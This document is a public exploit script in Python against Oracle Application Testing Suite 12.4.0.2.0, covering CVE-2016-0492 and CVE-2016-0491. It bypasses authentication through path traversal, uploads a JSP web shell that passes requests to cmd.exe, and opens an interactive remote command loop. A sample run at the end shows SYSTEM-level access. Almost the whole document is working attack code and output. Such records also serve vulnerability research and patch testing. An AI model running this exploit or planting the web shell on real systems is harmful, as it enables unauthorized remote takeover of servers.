# Exploit Title: Oracle Application Testing Suite Authentication Bypass and Arbitrary File Upload Remote Exploit
# Exploit Author: Zhou Yu <504137480@qq.com >
# Vendor Homepage: http://www.oracle.com/
# Software Link: http://www.oracle.com/technetwork/oem/downloads/apptesting-downloads-1983826.html?ssSourceSiteId=otncn
# Version: 12.4.0.2.0
# Tested on: Win7 SP1 32-bit
# CVE : CVE-2016-0492 and CVE-2016-0491

import urllib2
import urllib

ip = '192.168.150.239'
port = 8088

url = "http://" + ip + ":" + str(port)
#bypass authentication
url = url+"/olt/Login.do/../../olt/UploadFileUpload.do"
request = urllib2.Request(url)

webshell_content='''
<%@ page import="java.util.*,java.io.*"  %>
    <%
        if (request.getParameter("{cmd}") != null) {{
            Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("{cmd}"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while (disr != null) {{
                out.println(disr);
                disr = dis.readLine();
            }}
        }}
    %>
'''
boundary = "---------------------------7e01e2240a1e"
request.add_header('Content-Type', "multipart/form-data; boundary=" + boundary)
post_data = "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"storage.extension\"\r\n"
post_data = post_data + "\r\n.jsp\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"fileName1\"\r\n"
post_data = post_data + "\r\nwebshell.jsp\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"fileName2\"\r\n"
post_data = post_data + "\r\n\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"fileName3\"\r\n"
post_data = post_data + "\r\n\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"fileName4\"\r\n"
post_data = post_data + "\r\n\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"fileType\"\r\n"
post_data = post_data + "\r\n*\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"file1\"; filename=\"webshell.jsp\"\r\n"
post_data = post_data + "Content-Type: text/plain\r\n"
post_data = post_data + "\r\n" + webshell_content +"\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"storage.repository\"\r\n"
post_data = post_data + "\r\nDefault\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"storage.workspace\"\r\n"
post_data = post_data + "\r\n.\r\n"
post_data = post_data + "--" + boundary + "\r\n"
post_data = post_data + "Content-Disposition: form-data; name=\"directory\"\r\n"
post_data = post_data + "\r\n" + "../oats\servers\AdminServer\\tmp\_WL_user\oats_ee\\1ryhnd\war\pages" +"\r\n"
post_data = post_data + "--" + boundary + "--"+"\r\n"

try:
    request.add_data(post_data)
    response = urllib2.urlopen(request)
    if response.code == 200 :
        print "[+]upload done!"
        webshellurl = "http://" + ip + ":" + str(port) + "/olt/pages/webshell.jsp"
        print "[+]wait a moment,detecting whether the webshell exists..."
        if urllib2.urlopen(webshellurl).code == 200 :
            print "[+]upload webshell successfully!"
            print "[+]return a cmd shell"
            while True:
                cmd = raw_input(">>: ")
                if cmd == "exit" :
                    break
                print urllib.urlopen(webshellurl+"?{cmd}=" + cmd).read().lstrip()
        else:
            print "[-]attack fail!"
    else:
        print "[-]attack fail!"
except Exception as e:
    print "[-]attack fail!"

'''
#run the exploit and get a cmd shell
root@kali:~/Desktop# python exploit.py 
[+]upload done!
[+]wait a moment,detecting whether the webshell exists...
[+]upload webshell successfully!
[+]return a cmd shell
>>: whoami
nt authority\system


>>: exit
'''